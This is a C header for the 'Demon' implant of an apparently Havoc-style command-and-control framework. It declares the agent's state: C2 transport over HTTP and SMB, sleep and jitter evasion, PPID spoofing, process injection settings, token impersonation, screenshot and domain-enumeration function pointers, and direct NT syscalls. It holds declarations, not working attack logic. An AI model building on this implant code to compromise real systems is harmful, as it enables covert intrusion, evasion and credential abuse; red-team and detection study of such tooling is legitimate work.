#ifndef DEMON_DEMON_H
#define DEMON_DEMON_H

#include <windows.h>
#include <winsock2.h>
#include <ntstatus.h>

#include <Common/EnviromentBlock.h>
#include <Common/Macros.h>

#include <Core/WinUtils.h>
#include <Core/Token.h>
#include <Core/Pivot.h>
#include <Core/Spoof.h>
#include <Core/Jobs.h>

#include <Loader/CoffeeLdr.h>

#define DEMON_MAGIC_VALUE   0xDEADBEEF

#ifdef DEBUG
#include <stdio.h>
#endif

#define DLLEXPORT           __declspec( dllexport )
#define DLL_QUERY_HMODULE   6

#define WIN_VERSION_UNKNOWN 0
#define WIN_VERSION_XP      1
#define WIN_VERSION_VISTA   2
#define WIN_VERSION_2008    3
#define WIN_VERSION_7       4
#define WIN_VERSION_2008_R2 5
#define WIN_VERSION_2008_R2 6
#define WIN_VERSION_2012    7
#define WIN_VERSION_8       8
#define WIN_VERSION_8_1     8.1
#define WIN_VERSION_2012_R2 9
#define WIN_VERSION_10      10
#define WIN_VERSION_2016_X  11

#define IMAGE_SIZE( IM ) \
    ( ( ( PIMAGE_NT_HEADERS ) ( IM + ( ( PIMAGE_DOS_HEADER ) IM )->e_lfanew ) )->OptionalHeader.SizeOfImage )

// TODO: remove all variables that are not switched/changed after some time
typedef struct
{
    struct {
        UINT32              DemonID;
        BOOL                Connected;

        // Module Info
        LPVOID              ModuleBase;

        // Process Info
        DWORD               PID;
        DWORD               PPID;
        WORD                ProcessArch;

        // Computer Info
        WORD                OS_Arch;

        // Token Information
        DWORD               Integrity; // TODO: get this info and send it back
        DWORD               OSVersion;
    } Session;

    struct {
        // Evasion
        DWORD               Sleeping;
        DWORD               Jitter;

        // Kill Date
        DWORD               KillDate;

        struct {
#ifdef TRANSPORT_HTTP
            LPWSTR  Method;
            LPWSTR  Host;
            UINT32  Port;
            DWORD   Secure;
            LPWSTR  UserAgent;
            LPWSTR* Uris;
            LPWSTR* Headers;

            struct {
                BOOL   Enabled;
                LPWSTR Url;
                LPWSTR Username;
                LPWSTR Password;
            } Proxy;
#endif

#ifdef TRANSPORT_SMB
            LPSTR   Name;
            HANDLE  Handle;
#endif
        } Transport;

        struct
        {
            DWORD           SleepMaskTechnique;
            BOOL            Verbose;
            PVOID           ThreadStartAddr;
            BOOL            CoffeeThreaded;
            BOOL            CoffeeVeh;
        } Implant;

        struct
        {
            UINT32          Alloc;
            UINT32          Execute;
        } Memory;

        // Process Config
        struct
        {
            DWORD           PpidSpoof;
            BOOL            BlockDll;
            PCHAR           Spawn64;
            PCHAR           Spawn86;
        } Process;

        struct
        {
            DWORD           Technique;
            PVOID           SpoofAddr;
        } Inject;

        // Encryption / Decryption
        struct
        {
            PBYTE           Key;
            PBYTE           IV;
        } AES;

    } Config ;

    // TODO: format everything by library. inlcude syscalls too
    struct
    {
        // Kernel32
        WIN_FUNC( CreateRemoteThread )
        WIN_FUNC( CreateToolhelp32Snapshot )
        WIN_FUNC( VirtualProtect )
        WIN_FUNC( VirtualAllocEx )
        WIN_FUNC( CreateFileA )
        WIN_FUNC( GetFileSize )
        WIN_FUNC( CreateNamedPipeA )
        WIN_FUNC( WaitNamedPipeA )
        WIN_FUNC( PeekNamedPipe )
        WIN_FUNC( DisconnectNamedPipe )
        WIN_FUNC( WriteFile )
        WIN_FUNC( ConnectNamedPipe )
        WIN_FUNC( FreeLibrary )
        WIN_FUNC( GetProcAddress )
        WIN_FUNC( CreatePipe )
        WIN_FUNC( ReadFile )
        WIN_FUNC( GetComputerNameExA )
        WIN_FUNC( LocalAlloc )
        WIN_FUNC( LocalFree )
        WIN_FUNC( LocalReAlloc )
        WIN_FUNC( CreateProcessA )
        WIN_FUNC( ExitProcess )
        WIN_FUNC( TerminateProcess )
        WIN_FUNC( InitializeProcThreadAttributeList )
        WIN_FUNC( UpdateProcThreadAttribute )
        WIN_FUNC( VirtualProtectEx )
        WIN_FUNC( ReadProcessMemory )
        WIN_FUNC( GetCurrentDirectoryA )
        WIN_FUNC( FindFirstFileA )
        WIN_FUNC( FindNextFileA )
        WIN_FUNC( DeleteFileA )
        WIN_FUNC( RemoveDirectoryA )
        WIN_FUNC( CreateDirectoryA )
        WIN_FUNC( MoveFileA )
        WIN_FUNC( GetFileTime )
        WIN_FUNC( GetFileAttributesA )
        WIN_FUNC( FindClose )
        WIN_FUNC( FileTimeToSystemTime )
        WIN_FUNC( SystemTimeToTzSpecificLocalTime )
        WIN_FUNC( SetCurrentDirectoryA )
        WIN_FUNC( Wow64DisableWow64FsRedirection )
        WIN_FUNC( Wow64RevertWow64FsRedirection )
        WIN_FUNC( CopyFileA )

        // Ntdll
        NTSTATUS ( NTAPI *LdrLoadDll ) (
                PWCHAR,
                ULONG,
                PUNICODE_STRING,
                PHANDLE
        );
        NTSTATUS ( NTAPI* LdrGetProcedureAddress )(
                PVOID,
                PANSI_STRING,
                ULONG,
                PVOID*
        );

        WIN_FUNC( RtlAllocateHeap )
        PVOID ( NTAPI *RtlReAllocateHeap )(
                PVOID,
                ULONG,
                PVOID,
                ULONG
        );
        WIN_FUNC( RtlFreeHeap )
        ULONG ( WINAPI *RtlRandomEx ) (
                PULONG
        );
        ULONG ( WINAPI *RtlNtStatusToDosError ) (
                NTSTATUS Status
        );
        VOID ( WINAPI* RtlGetVersion ) (
                POSVERSIONINFOEXW
        );
        VOID ( NTAPI* RtlExitUserThread ) (
                NTSTATUS Status
        );
        VOID ( NTAPI* RtlExitUserProcess ) (
                NTSTATUS Status
        );
        NTSTATUS ( NTAPI* RtlCreateTimer )(
                HANDLE TimerQueueHandle,
                HANDLE *Handle,
                WAITORTIMERCALLBACKFUNC Function,
                PVOID Context,
                ULONG DueTime,
                ULONG Period,
                ULONG Flags
        );
        NTSTATUS ( NTAPI* RtlCreateTimerQueue ) (
                PHANDLE TimerQueueHandle
        );
        NTSTATUS ( NTAPI* RtlDeleteTimerQueue ) (
                HANDLE TimerQueueHandle
        );
        WIN_FUNC( RtlCaptureContext );
        PVOID ( NTAPI *RtlAddVectoredExceptionHandler ) (
                ULONG FirstHandler,
                PVECTORED_EXCEPTION_HANDLER VectoredHandler
        );
        ULONG ( NTAPI* RtlRemoveVectoredExceptionHandler ) (
                PVOID VectoredHandlerHandle
        );

        WIN_FUNC( NtClose );
        NTSTATUS ( NTAPI* NtSetEvent ) (
                HANDLE  EventHandle,
                PLONG   PreviousState
        );
        NTSTATUS NTAPI ( NTAPI* NtCreateEvent )(
            PHANDLE            EventHandle,
            ACCESS_MASK        DesiredAccess,
            POBJECT_ATTRIBUTES ObjectAttributes,
            EVENT_TYPE         EventType,
            BOOLEAN            InitialState
        );

        // WinHTTP
        // NOTE: maybe change to WinInet
        WIN_FUNC( WinHttpOpen )
        WIN_FUNC( WinHttpConnect )
        WIN_FUNC( WinHttpOpenRequest )
        WIN_FUNC( WinHttpSetOption )
        WIN_FUNC( WinHttpCloseHandle )
        WIN_FUNC( WinHttpSendRequest )
        WIN_FUNC( WinHttpAddRequestHeaders )
        WIN_FUNC( WinHttpReceiveResponse )
        WIN_FUNC( WinHttpWebSocketCompleteUpgrade )
        WIN_FUNC( WinHttpQueryDataAvailable )
        WIN_FUNC( WinHttpReadData )

        // Mscoree
        HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );

        // Oleaut32
        WIN_FUNC( SafeArrayAccessData )
        WIN_FUNC( SafeArrayUnaccessData )
        WIN_FUNC( SafeArrayCreate )
        WIN_FUNC( SafeArrayCreateVector )
        WIN_FUNC( SafeArrayPutElement )
        WIN_FUNC( SafeArrayDestroy )
        WIN_FUNC( SysAllocString )

        // Advapi32
        WIN_FUNC( GetTokenInformation )
        WIN_FUNC( GetUserNameA )
        WIN_FUNC( CreateProcessWithTokenW )
        WIN_FUNC( CreateProcessAsUserA )
        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );

        // Thread Management
        WIN_FUNC( OpenThread )
        WIN_FUNC( Thread32First )
        WIN_FUNC( Thread32Next )
        WIN_FUNC( ResumeThread )

        WIN_FUNC( GetThreadContext )
        WIN_FUNC( SetThreadContext )

        WIN_FUNC( ConvertThreadToFiberEx );
        WIN_FUNC( ConvertFiberToThread );
        WIN_FUNC( SwitchToFiber );
        WIN_FUNC( CreateFiberEx );
        WIN_FUNC( DeleteFiber );

        // Token Management
        WIN_FUNC( RevertToSelf )
        WIN_FUNC( LookupAccountSidA )
        WIN_FUNC( LookupPrivilegeNameA )
        WIN_FUNC( ImpersonateLoggedOnUser )
        WIN_FUNC( LogonUserA )
        WIN_FUNC( AdjustTokenPrivileges )
        WIN_FUNC( OpenProcessToken )
        WIN_FUNC( OpenThreadToken )
        WIN_FUNC( LookupPrivilegeValueA )

        // String Formatting
        INT ( *vsnprintf ) ( PCHAR, SIZE_T, CONST PCHAR, va_list );

        // * MISC *
        WIN_FUNC( CommandLineToArgvW )

        WIN_FUNC( AllocConsole )
        WIN_FUNC( FreeConsole )
        WIN_FUNC( GetConsoleWindow )
        WIN_FUNC( ShowWindow )
        WIN_FUNC( GetStdHandle )
        WIN_FUNC( SetStdHandle )
        WIN_FUNC( GetTickCount )

        WIN_FUNC( GetAdaptersInfo )

        WIN_FUNC( WaitForSingleObjectEx )


        // Screenshot
        WIN_FUNC( GetSystemMetrics )
        WIN_FUNC( GetDC )
        WIN_FUNC( GetCurrentObject )
        WIN_FUNC( GetObjectW )
        WIN_FUNC( CreateCompatibleDC )
        WIN_FUNC( CreateDIBSection )
        WIN_FUNC( SelectObject )
        WIN_FUNC( BitBlt )
        WIN_FUNC( DeleteObject )
        WIN_FUNC( DeleteDC )
        WIN_FUNC( ReleaseDC )

        // Netapi
        WIN_FUNC( NetWkstaUserEnum )
        WIN_FUNC( NetSessionEnum )
        WIN_FUNC( NetLocalGroupEnum )
        WIN_FUNC( NetGroupEnum )
        WIN_FUNC( NetUserEnum )
        WIN_FUNC( NetShareEnum )
        WIN_FUNC( NetApiBufferFree )


        WIN_FUNC( SetProcessValidCallTargets )

    } Win32;

    struct
    {
        WIN_FUNC( NtOpenFile )

        NTSTATUS ( NTAPI* NtOpenThread ) (
                PHANDLE            ThreadHandle,
                ACCESS_MASK        DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                PCLIENT_ID         ClientId
        );

        NTSTATUS ( NTAPI* NtCreateSection ) (
                PHANDLE            SectionHandle,
                ACCESS_MASK        DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                PLARGE_INTEGER     MaximumSize,
                ULONG              SectionPageProtection,
                ULONG              AllocationAttributes,
                HANDLE             FileHandle
        );

        NTSTATUS ( NTAPI* NtMapViewOfSection ) (
                HANDLE          SectionHandle,
                HANDLE          ProcessHandle,
                PVOID           *BaseAddress,
                ULONG_PTR       ZeroBits,
                SIZE_T          CommitSize,
                PLARGE_INTEGER  SectionOffset,
                PSIZE_T         ViewSize,
                SECTION_INHERIT InheritDisposition,
                ULONG           AllocationType,
                ULONG           Win32Protect
        );

        NTSTATUS ( NTAPI* NtOpenProcess ) (
                PHANDLE            ProcessHandle,
                ACCESS_MASK        DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                PCLIENT_ID         ClientId
        );

        NTSTATUS ( NTAPI* NtOpenProcessToken ) (
                HANDLE      ProcessHandle,
                ACCESS_MASK DesiredAccess,
                PHANDLE     TokenHandle
        );

        NTSTATUS ( NTAPI* NtDuplicateToken ) (
                HANDLE             ExistingTokenHandle,
                ACCESS_MASK        DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                BOOLEAN            EffectiveOnly,
                TOKEN_TYPE         TokenType,
                PHANDLE            NewTokenHandle
        );

        NTSTATUS ( NTAPI* NtQueueApcThread ) (
                HANDLE               ThreadHandle,
                PIO_APC_ROUTINE      ApcRoutine,
                PVOID                ApcRoutineContext,
                PIO_STATUS_BLOCK     ApcStatusBlock,
                ULONG                ApcReserved
        );

        NTSTATUS ( NTAPI* NtSuspendThread ) (
                HANDLE      ThreadHandle,
                PULONG      PreviousSuspendCount
        );

        NTSTATUS ( NTAPI* NtResumeThread ) (
                HANDLE      ThreadHandle,
                PULONG      SuspendCount
        );

        NTSTATUS ( NTAPI* NtCreateEvent ) (
                PHANDLE            EventHandle,
                ACCESS_MASK        DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                EVENT_TYPE         EventType,
                BOOLEAN            InitialState
        );

        NTSTATUS ( NTAPI* NtCreateThreadEx ) (
                PHANDLE     hThread,
                ACCESS_MASK DesiredAccess,
                PVOID       ObjectAttributes,
                HANDLE      ProcessHandle,
                PVOID       lpStartAddress,
                PVOID       lpParameter,
                ULONG       Flags,
                SIZE_T      StackZeroBits,
                SIZE_T      SizeOfStackCommit,
                SIZE_T      SizeOfStackReserve,
                PVOID       lpBytesBuffer
        );

        NTSTATUS ( NTAPI* NtDuplicateObject )(
                HANDLE      SourceProcessHandle,
                HANDLE      SourceHandle,
                HANDLE      TargetProcessHandle,
                PHANDLE     TargetHandle,
                ACCESS_MASK DesiredAccess,
                ULONG       HandleAttributes,
                ULONG       Options
        );

        NTSTATUS ( NTAPI* NtGetContextThread ) (
                HANDLE      ThreadHandle,
                PCONTEXT    pContext
        );

        NTSTATUS ( NTAPI* NtSetContextThread ) (
                HANDLE      ThreadHandle,
                PCONTEXT    pContext
        );

        NTSTATUS ( NTAPI* NtQueryInformationProcess ) (
                HANDLE           ProcessHandle,
                PROCESSINFOCLASS ProcessInformationClass,
                PVOID            ProcessInformation,
                ULONG            ProcessInformationLength,
                PULONG           ReturnLength
        );

        NTSTATUS ( NTAPI* NtQuerySystemInformation ) (
                SYSTEM_INFORMATION_CLASS SystemInformationClass,
                PVOID                    SystemInformation,
                ULONG                    SystemInformationLength,
                PULONG                   ReturnLength
        );

        NTSTATUS ( NTAPI* NtWaitForSingleObject ) (
                HANDLE          Handle,
                BOOLEAN         Alertable,
                PLARGE_INTEGER  Timeout
        );

        NTSTATUS ( NTAPI* NtTestAlert ) ( VOID );

        NTSTATUS ( NTAPI* NtAllocateVirtualMemory ) (
                HANDLE    ProcessHandle,
                PVOID     *BaseAddress,
                ULONG_PTR ZeroBits,
                PSIZE_T   RegionSize,
                ULONG     AllocationType,
                ULONG     Protect
        );

        NTSTATUS ( NTAPI* NtFlushInstructionCache ) (
                HANDLE  ProcessHandle,
                PVOID   BaseAddress,
                ULONG   NumberOfBytesToFlush
        );

        NTSTATUS ( NTAPI* NtWriteVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   BaseAddress,
                PVOID   Buffer,
                ULONG   NumberOfBytesToWrite,
                PULONG  NumberOfBytesWritten
        );

        NTSTATUS ( NTAPI* NtReadVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   BaseAddress,
                PVOID   Buffer,
                ULONG   NumberOfBytesToRead,
                PULONG  NumberOfBytesReaded
        );

        NTSTATUS ( NTAPI* NtFreeVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   FreeType
        );

        NTSTATUS ( NTAPI* NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PULONG  RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );


        NTSTATUS ( NTAPI* NtTerminateThread ) (
                HANDLE      ThreadHandle,
                NTSTATUS    ExitStatus
        );

        NTSTATUS ( NTAPI* NtContinue ) (
                PCONTEXT    ThreadContext,
                BOOLEAN     RaiseAlert
        );

        NTSTATUS ( NTAPI* NtAlertResumeThread ) (
                HANDLE  ThreadHandle,
                PULONG  SuspendCount
        );

        NTSTATUS ( NTAPI* NtSignalAndWaitForSingleObject ) (
                HANDLE          ObjectToSignal,
                HANDLE          WaitableObject,
                BOOLEAN         Alertable,
                PLARGE_INTEGER  Time
        );

        NTSTATUS ( NTAPI* NtQueryVirtualMemory )(
                HANDLE                   ProcessHandle,
                PVOID                    BaseAddress,
                MEMORY_INFORMATION_CLASS MemoryInformationClass,
                PVOID                    MemoryInformation,
                SIZE_T                   MemoryInformationLength,
                PSIZE_T                  ReturnLength
        );

        NTSTATUS ( NTAPI *NtQueryInformationToken )(
            HANDLE                  TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            PVOID                   TokenInformation,
            ULONG                   TokenInformationLength,
            PULONG                  ReturnLength
        );

        NTSTATUS ( NTAPI* NtQueryInformationThread ) (
            HANDLE          ThreadHandle,
            THREADINFOCLASS ThreadInformationClass,
            PVOID           ThreadInformation,
            ULONG           ThreadInformationLength,
            PULONG          ReturnLength
        );

    } Syscall ;

    struct {
        PVOID  Kernel32;
        PVOID  Advapi32;
        PVOID  Crypt32;
        PVOID  CryptSp;
        PVOID  Mscoree;
        PVOID  Oleaut32;
        PVOID  Ntdll;
        PVOID  User32;
        PVOID  Shell32;
        PVOID  Msvcrt;
        PVOID  KernelBase;
        PVOID  Iphlpapi;
        PVOID  Gdi32;
        PVOID  Wkscli;
        PVOID  NetApi32;

#ifdef TRANSPORT_TCP
        PVOID  Ws2_32;
#endif

#ifdef TRANSPORT_HTTP
        PVOID  WinHttp;
#endif
    } Modules ;

    _PTEB               ThreadEnvBlock;

    // global linked lists

    struct {
        PTOKEN_LIST_DATA Vault;
        PTOKEN_LIST_DATA Token;
        BOOL             Impersonate;
    } Tokens;

    PPIVOT_DATA  SmbPivots;
    PJOB_DATA    Jobs;

    // Counter of current running threads created by our agent.
    DWORD Threads;

} INSTANCE, *PINSTANCE ;

extern PINSTANCE Instance;

VOID        DxInitialization( VOID );
VOID        Int32ToBuffer( PUCHAR, UINT32 );

#endif
